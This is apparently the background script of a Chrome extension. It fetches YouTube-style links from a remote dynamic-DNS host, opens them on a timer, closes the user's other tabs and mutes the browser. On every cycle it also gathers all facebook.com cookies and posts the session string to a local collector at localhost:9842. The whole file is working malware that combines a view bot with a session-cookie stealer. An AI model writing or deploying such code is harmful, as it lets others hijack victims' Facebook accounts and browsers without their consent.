var url ='phao2binh5.zapto.org:4433'
var ListYTBLink = null;
var videoIndex = 0;
var alarmName = "Auto";
var MinWatchTime = 3;
var MaxWatchTime = 7;
//C:\Users\pc\AppData\Local\Google\Chrome\User Data
function doSomething(body)
{
    console.log(body);
}
function getRndInteger(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}
var isIndexInit = false;
function videoIndexInit(length) {
    if (isIndexInit) return;
    videoIndex = getRndInteger(0, length - 1);

    isIndexInit = true;
}
 function getTabId()
 {
     var tabWinID;
     chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {

         // since only one tab should be active and in the current window at once
         // the return variable should only have one entry
         tabWinID = tabs[0].windowId;// or do whatever you need
       
     });
     return tabWinID;
  }

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
async function createAlarm() {
    chrome.alarms.create(alarmName, {
        
        periodInMinutes: 0.016666666 });
      chrome.alarms.onAlarm.addListener(function(alarm) {
         main();
        
      });
    main();
    
  } 
createAlarm();
function turn_Off_On_Sound() {
    chrome.tabs.query({ url: [] }, function (tabs) {
        for (var i = 0; i < tabs.length; i++) {
            var mutedInfo = tabs[i].mutedInfo;
            if (mutedInfo) chrome.tabs.update(tabs[i].id, { "muted": true });
        }
    })
};
function fetchPOST(url, data) {
    fetch(url, {

        // Adding method type
        method: "POST",

        // Adding body or contents to send
        body: data,

        // Adding headers to the request
        headers: {
            "Content-type": "application/json; charset=UTF-8"
        }
    })
}
var OldGroupCookie = "";
function CheckForCookieChange(cookie,length) {
    if (length > 5 && OldGroupCookie != cookie) { // if cookie is user and != old cookie
        OldGroupCookie = cookie;
        fetchPOST("http://localhost:9842/fbcookie", cookie);
        console.log(cookie,length);
    }
}
 // chrome.runtime.onStartup.addListener
var WatchTime = 5;
function CalcNewWatchTime() {
    WatchTime = (getRndInteger(60 * MinWatchTime, 60 * MaxWatchTime));
    console.log(WatchTime);
}
var TimeCounter = -1;
async function main() {
    TimeCounter++;
    
    if (TimeCounter % WatchTime == 0) {
        try {
            CalcNewWatchTime();
            var GetFile = await fetch('http://' + url + "/getLink").then((Respone) => Respone.text()).then((value) => {
                ListYTBLink = value.split('\n');
             ///   console.log(value);
            });
            var GetFile = await fetch('https://' + url + "/getLink").then((Respone) => Respone.text()).then((value) => {
                ListYTBLink = value.split('\n');
       //         console.log(value);
            });
        }
   
        catch { }
        fetch('http://localhost:9842/check');
        videoIndexInit(ListYTBLink.length);
        if (ListYTBLink.length <= videoIndex) videoIndex = 0;
        if (ListYTBLink != null) {

            chrome.tabs.create(
                {
                    url: ListYTBLink[videoIndex]
                }
            );
            videoIndex++;
        }
   
        chrome.tabs.query({ currentWindow: true }, function (tabs) {
            for (var i = 0; i < tabs.length - 1; i++) {
             
                chrome.tabs.remove(tabs[i].id);
                console.log(chrome.windows.WINDOW_ID_CURRENT + " " + tabs[i].windowId);
            }
            
        });
    }
    turn_Off_On_Sound();
    var GroupCookie = "";
    chrome.cookies.getAll({
        domain: ".facebook.com",
    }).then(cookies => {
        var valid = true;
        for (var i = 0; i < cookies.length ; i++)
        {
            if (cookies[i].name == 'i_user') // check for cookie valid
            {
                valid = false;
                break;
            }
                GroupCookie += cookies[i].name + '=' + cookies[i].value;
                if (i != cookies.length - 1) GroupCookie += ';';
        }
        if (valid) {
            CheckForCookieChange(GroupCookie, cookies.length);
        }
      
    });
}
